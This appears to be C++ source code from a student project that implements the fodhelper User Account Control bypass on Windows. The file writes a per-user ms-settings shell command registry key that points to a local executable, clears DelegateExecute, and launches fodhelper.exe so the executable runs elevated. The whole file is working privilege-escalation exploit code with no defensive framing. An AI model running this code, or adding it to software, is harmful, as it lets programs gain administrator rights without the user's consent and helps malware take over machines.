#include <winsock2.h>
#include <windows.h>
#include <CommCtrl.h>
#include <tchar.h>
#include <shlobj.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <string>
using namespace std;

LSTATUS SetRegValue(HKEY keyHandle, const wchar_t* valueTitle, const wchar_t* valueData) {
    return RegSetValueEx(keyHandle, valueTitle, 0, REG_SZ, (const BYTE*)valueData, (wcslen(valueData) + 1) * sizeof(wchar_t));
}

int ConfigureRegistry() {
    HKEY keyHandle;
    DWORD disposition;

    const wchar_t* registryPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const wchar_t* command = L"cmd /c start \"Terminal1\" C:\\Windows\\System32\\cmd.exe /c C://Users/sergio/Desktop/PruebaPermisos/x64/Debug/TFG.exe";
    const wchar_t* delegate = L"";

    LSTATUS status = RegCreateKeyEx(HKEY_CURRENT_USER, registryPath, 0, NULL, 0, KEY_WRITE, NULL, &keyHandle, &disposition);
    wprintf(status != ERROR_SUCCESS ? L"failed to open or create reg key\n" : L"successfully create reg key\n");

    status = SetRegValue(keyHandle, L"", command);
    wprintf(status != ERROR_SUCCESS ? L"failed to set reg value\n" : L"successfully set reg value\n");

    status = SetRegValue(keyHandle, L"DelegateExecute", delegate);
    wprintf(status != ERROR_SUCCESS ? L"failed to set reg value: DelegateExecute\n" : L"successfully set reg value: DelegateExecute\n");

    RegCloseKey(keyHandle);

    return status != ERROR_SUCCESS ? 1 : 0;
}

int InitiateElevatedProc() {
    SHELLEXECUTEINFO execInfo = { sizeof(execInfo) };
    execInfo.lpVerb = L"runas";
    execInfo.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    execInfo.hwnd = NULL;
    execInfo.nShow = SW_NORMAL;

    if (!ShellExecuteEx(&execInfo)) {
        DWORD errCode = GetLastError();
        wprintf(errCode == ERROR_CANCELLED ? L"User refused to allow privileges elevation.\n" : L"Error code: %ld\n", errCode);
        return 1;
    }
    else {
        wprintf(L"successfully create process!!=\n");
        return 0;
    }
}

int OverrideUAC() {

    if (ConfigureRegistry() != 0) {
        return 1;
    }

    return InitiateElevatedProc();
}
